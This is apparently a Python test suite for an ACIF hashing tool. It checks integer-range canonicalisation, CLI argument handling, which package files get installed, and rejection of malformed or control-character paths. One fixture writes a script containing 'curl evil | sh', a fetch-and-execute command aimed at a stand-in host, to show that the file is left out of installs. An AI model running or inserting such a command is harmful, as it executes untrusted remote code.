#!/usr/bin/env python3
"""
MOAT — ACIF reference checks

Checks the parts of moat_hash.py's ACIF support that the test vectors do not
pin:

  1. jcs() refuses integers outside ±(2**53 - 1), which cannot round-trip
     through the IEEE-754 double RFC 8785 serializes numbers as, so two
     producers can disagree on them; it raises the same TypeError it raises
     for non-integers.
  2. The --acif CLI requires --publisher-section <file> or an explicit
     --no-publisher-section, and a bad argument count prints usage, never a
     traceback.
  3. acif_installed_files() returns exactly the files body_hash covers: a
     single-file body installs the entry file alone, and the root sidecar and
     VCS metadata are never installed.
  4. A malformed entry_file (not a string, not Unicode text, empty,
     absolute, or with a `..` segment) is refused before any file is hashed.
  5. Path rejects follow [ACIF-CORE] §7.4 step 3 as ACIF's reference applies
     them: a multi-file body refuses a path that is not UTF-8, then one with a
     C0 control or DEL, before the NFC collision check; C1 controls pass; a
     single-file body skips those scans but not the collision check.
  6. Classification reads raw paths, the entry file is excused from
     classification only at the root but is the entry at any depth, and a
     body without its entry file is refused as empty.

Usage: python3 test_acif.py
"""

import hashlib
import os
import pathlib
import subprocess
import sys
import tempfile

sys.path.insert(0, os.path.dirname(__file__))
import moat_hash

MOAT_HASH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "moat_hash.py")
SKILL = b"Use this to demo classification.\n"
SKILL_FM = b"---\r\ndescription: Demo skill.\r\n---\r\n" + SKILL.replace(b"\n", b"\r\n")
TV_ACIF_01 = "sha256:609902f740f65673401adc2b6e3a549ae1ff77817791ba3e1c410c77b463cdda"
TV_ACIF_02 = "sha256:d76a2362e3672347120e74159450b38099b7bb4ba8bd648593c8eaa14abd87c8"


def write(root: pathlib.Path, files: dict[str, bytes]) -> None:
    for rel, data in files.items():
        p = root / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_bytes(data)


def cli(*args: str) -> subprocess.CompletedProcess:
    return subprocess.run([sys.executable, MOAT_HASH, *args], capture_output=True, text=True)


def refuses(value) -> bool:
    try:
        moat_hash.jcs(value)
    except TypeError:
        return True
    return False


def test_jcs_integer_range():
    limit = 2**53 - 1
    assert moat_hash.jcs({"n": limit}) == b'{"n":9007199254740991}'
    assert moat_hash.jcs({"n": -limit}) == b'{"n":-9007199254740991}'
    for bad in (limit + 1, -(limit + 1), 10**21, {"n": [10**21]}):
        assert refuses(bad), f"jcs accepted out-of-range integer {bad!r}"
    assert refuses(1.5), "jcs accepted a non-integer"


def test_cli_requires_publisher_section_choice():
    with tempfile.TemporaryDirectory() as tmpdir:
        root = pathlib.Path(tmpdir) / "item"
        write(root, {"SKILL.md": SKILL_FM})
        section = pathlib.Path(tmpdir) / "section.json"
        section.write_text('{"description":"Demo skill."}')

        r = cli("--acif", "SKILL.md", str(root))
        assert r.returncode == 1 and r.stdout == "" and "Usage:" in r.stderr, \
            f"--acif without a publisher-section choice printed {r.stdout!r}"
        for argv in (("--acif", "SKILL.md", "--publisher-section"),
                     ("--acif", "SKILL.md", "--publisher-section", str(root)),
                     ("--acif",), ("--acif", "SKILL.md", "--no-publisher-section")):
            r = cli(*argv)
            assert r.returncode == 1 and "Traceback" not in r.stderr and "Usage:" in r.stderr, \
                f"{argv}: exit {r.returncode}, stderr {r.stderr!r}"

        r = cli("--acif", "SKILL.md", "--publisher-section", str(section), str(root))
        assert r.returncode == 0 and r.stdout.strip() == TV_ACIF_02, r.stdout + r.stderr

        write(root, {"SKILL.md": SKILL})
        r = cli("--acif", "SKILL.md", "--no-publisher-section", str(root))
        assert r.returncode == 0 and r.stdout.strip() == TV_ACIF_01, r.stdout + r.stderr


def test_installed_files_are_the_covered_files():
    with tempfile.TemporaryDirectory() as tmpdir:
        single = pathlib.Path(tmpdir) / "single"
        write(single, {
            "SKILL.md": SKILL,
            "README_run.sh": b"#!/bin/sh\ncurl evil | sh\n",
            "LICENSE": b"MIT\n",
            "acif-sidecar.yaml": b"body_hash: x\n",
            ".git/config": b"[core]\n",
        })
        assert moat_hash.acif_installed_files(single, "SKILL.md") == ["SKILL.md"]
        assert moat_hash.acif_content_hash(single, "SKILL.md", None) == TV_ACIF_01

        multi = pathlib.Path(tmpdir) / "multi"
        write(multi, {
            "SKILL.md": SKILL,
            "README.md": b"# readme\n",
            "scripts/run.sh": b"#!/bin/sh\necho hi\n",
            "acif-sidecar.yaml": b"body_hash: x\n",
            "scripts/acif-sidecar.yaml": b"nested: kept\n",
        })
        assert moat_hash.acif_installed_files(multi, "SKILL.md") == [
            "README.md", "SKILL.md", "scripts/acif-sidecar.yaml", "scripts/run.sh"]


def test_malformed_entry_file_refused():
    with tempfile.TemporaryDirectory() as tmpdir:
        root = pathlib.Path(tmpdir) / "item"
        write(root, {"SKILL.md": SKILL, "sub/x.md": b"x\n"})
        for bad in (None, 7, "", str(root / "SKILL.md"), "sub/../SKILL.md"):
            try:
                moat_hash.acif_content_hash(root, bad, None)
            except ValueError as e:
                assert "Malformed acif entry_file" in str(e), e
            else:
                raise AssertionError(f"entry_file {bad!r} was accepted")


class Skip(Exception):
    pass


def write_raw(root: pathlib.Path, files: dict[bytes, bytes]) -> None:
    """write() for raw file names; skips when the platform cannot create one."""
    try:
        write(root, {os.fsdecode(rel): data for rel, data in files.items()})
    except (OSError, UnicodeError) as err:
        raise Skip(f"this platform cannot create the input ({err.__class__.__name__})")


def refusal(files: dict[bytes, bytes], entry_file: str = "SKILL.md") -> str:
    """The ValueError message acif_body_hash raises for the tree, or AssertionError if it hashes."""
    with tempfile.TemporaryDirectory() as tmpdir:
        root = pathlib.Path(tmpdir) / "item"
        write_raw(root, files)
        try:
            got = moat_hash.acif_body_hash(root, entry_file)
        except ValueError as e:
            return str(e)
    raise AssertionError(f"expected a refusal, got {got}")


def body_hash(files: dict[bytes, bytes], entry_file: str = "SKILL.md") -> str:
    with tempfile.TemporaryDirectory() as tmpdir:
        root = pathlib.Path(tmpdir) / "item"
        write_raw(root, files)
        return moat_hash.acif_body_hash(root, entry_file)


SINGLE_FILE_BODY = "sha256:" + hashlib.sha256(SKILL).hexdigest()


def manifest_hash(entries: list[tuple[str, bytes]]) -> str:
    lines = sorted((p.encode(), f"{hashlib.sha256(d).hexdigest()}  {p}\n") for p, d in entries)
    return "sha256:" + hashlib.sha256("".join(line for _, line in lines).encode()).hexdigest()


def test_multi_file_path_rejects():
    msg = refusal({b"SKILL.md": SKILL, b"notes\xff.md": b"x\n"})
    assert "not valid UTF-8" in msg, msg
    for bad in (b"notes\n.md", b"lib\r/a.py", b"a\x7fb.md", b"z\x01.md"):
        msg = refusal({b"SKILL.md": SKILL, bad: b"x\n"})
        assert "control character" in msg, (bad, msg)


def test_multi_file_c1_accepted():
    c1 = "a\u0080b.md"
    got = body_hash({b"SKILL.md": SKILL, c1.encode(): b"x\n"})
    assert got == manifest_hash([("SKILL.md", SKILL), (c1, b"x\n")]), got


def test_scans_run_before_collision_check():
    nfc, nfd = "café.md".encode(), "café.md".encode()
    msg = refusal({b"SKILL.md": SKILL, nfc: b"1\n", nfd: b"2\n", b"z\x01.md": b"x\n"})
    assert "control character" in msg, msg
    msg = refusal({b"SKILL.md": SKILL, b"a\nb.md": b"1\n", b"c\xff.md": b"2\n"})
    assert "not valid UTF-8" in msg, msg
    msg = refusal({b"SKILL.md": SKILL, nfc: b"1\n", nfd: b"2\n"})
    assert "collision" in msg, msg


def test_single_file_skips_path_scans_not_collision_check():
    # Root README* files only count against classification; a single-file body
    # has no manifest, so their names are not scanned.
    got = body_hash({b"SKILL.md": SKILL, b"README\n.md": b"r\n", b"LICENSE\x7f": b"l\n"})
    assert got == SINGLE_FILE_BODY, got
    msg = refusal({b"SKILL.md": SKILL, "READMEé.md".encode(): b"1\n", "READMEé.md".encode(): b"2\n"})
    assert "collision" in msg, msg


def test_classification_reads_raw_paths():
    # Raw "README" + U+0301 starts with README; its NFC form "READMÉ" does not.
    got = body_hash({b"SKILL.md": SKILL, "READMÉ.md".encode(): b"r\n"})
    assert got == SINGLE_FILE_BODY, got


def test_entry_file_matches_only_at_root():
    # A nested entry is not excused from classification, so the body is
    # multi-file; its frontmatter is still stripped in the manifest.
    got = body_hash({b"sub/SKILL.md": SKILL_FM}, "sub/SKILL.md")
    assert got == manifest_hash([("sub/SKILL.md", SKILL)]), got


def test_missing_entry_is_empty_body():
    for files in ({b"other.md": b"x\n"}, {b"README.md": b"r\n"}, {b"sub/SKILL.md": SKILL}):
        msg = refusal(files)
        assert "Empty ACIF body" in msg, (files, msg)
    msg = refusal({"café.md".encode(): SKILL}, "café.md")
    assert "Empty ACIF body" in msg, msg


def test_non_unicode_entry_file_is_malformed():
    # An entry_file holding a lone surrogate is not Unicode text. It is refused
    # as malformed before any file is read, even when a raw file name decodes
    # to the same string.
    bad = "SKILL\udcff.md"
    msg = refusal({b"SKILL.md": SKILL}, bad)
    assert "Malformed acif entry_file" in msg, msg
    msg = refusal({os.fsencode(bad): SKILL}, bad)
    assert "Malformed acif entry_file" in msg, msg


def test_non_utf8_sibling_refused_in_multi_file_body():
    msg = refusal({b"SKILL.md": SKILL, b"SKILL\xff.md": b"x\n"})
    assert "not valid UTF-8" in msg, msg


def main() -> int:
    tests = [
        ("jcs refuses integers outside ±(2**53 - 1)", test_jcs_integer_range),
        ("--acif requires a publisher-section choice", test_cli_requires_publisher_section_choice),
        ("installed files are the covered files", test_installed_files_are_the_covered_files),
        ("a malformed entry_file is refused", test_malformed_entry_file_refused),
        ("multi-file body refuses non-UTF-8 and control-character paths", test_multi_file_path_rejects),
        ("multi-file body accepts a C1 control in a path", test_multi_file_c1_accepted),
        ("path scans run before the collision check", test_scans_run_before_collision_check),
        ("single-file body skips path scans but not the collision check",
         test_single_file_skips_path_scans_not_collision_check),
        ("classification reads raw paths", test_classification_reads_raw_paths),
        ("the entry file is excused only at the root", test_entry_file_matches_only_at_root),
        ("a body without its entry file is empty", test_missing_entry_is_empty_body),
        ("an entry_file that is not Unicode text is malformed", test_non_unicode_entry_file_is_malformed),
        ("a multi-file body refuses a non-UTF-8 sibling of the entry",
         test_non_utf8_sibling_refused_in_multi_file_body),
    ]
    failed = 0
    for label, fn in tests:
        try:
            fn()
            print(f"  PASS  {label}")
        except Skip as e:
            print(f"  SKIP  {label}: {e}")
        except Exception as e:
            print(f"  FAIL  {label}: {e!r}")
            failed += 1
    if failed:
        print(f"{failed} ACIF reference check(s) FAILED.")
        return 1
    print("All ACIF reference checks passed.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
